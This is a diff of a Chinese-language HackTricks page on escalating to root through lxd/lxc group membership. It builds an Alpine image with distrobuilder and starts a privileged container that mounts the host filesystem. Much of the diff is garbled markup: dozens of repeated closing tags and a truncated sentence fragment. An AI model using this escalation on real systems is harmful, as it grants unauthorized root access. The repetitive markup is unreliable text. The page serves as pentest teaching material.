@@ -1,8 +1,8 @@
 # lxd/lxc 组 - 权限提升
 
 {% hint style="success" %}
-学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -14,53 +14,37 @@
 
 </details>
 {% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
 
-如果你属于 _**lxd**_ **或** _**lxc**_ **组**，你可以成为 root
+如果您属于 _**lxd**_ **或** _**lxc**_ **组**，您可以成为 root
 
 ## 无需互联网的利用
 
 ### 方法 1
 
-你可以在你的机器上安装这个发行版构建工具：[https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)（按照 GitHub 的说明进行操作）：
+您可以在您的机器上安装这个发行版构建工具：[https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)（按照 GitHub 的说明进行操作）：
 ```bash
 sudo su
-#Install requirements
+# Install requirements
 sudo apt update
 sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
-#Clone repo
+
+# Clone repo
 git clone https://github.com/lxc/distrobuilder
-#Make distrobuilder
+
+# Make distrobuilder
 cd distrobuilder
 make
-#Prepare the creation of alpine
+
+# Prepare the creation of alpine
 mkdir -p $HOME/ContainerImages/alpine/
 cd $HOME/ContainerImages/alpine/
 wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
-#Create the container
+
+# Create the container
+## Using build-lxd
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
+## Using build-lxc
+sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
 ```
 上传文件 **lxd.tar.xz** 和 **rootfs.squashfs**，将镜像添加到仓库并创建一个容器：
 ```bash
@@ -110,7 +94,8 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 
-{% hint style="success" %}
+<div data-gb-custom-block data-tag="hint" data-style='success'>
+
 Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
 Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
@@ -123,52 +108,103 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 * **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
-{% endhint %}
+</div>
+
 </details>
-{% endhint %}
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+</div>
+
+</details>
+
+</div>
+```
+
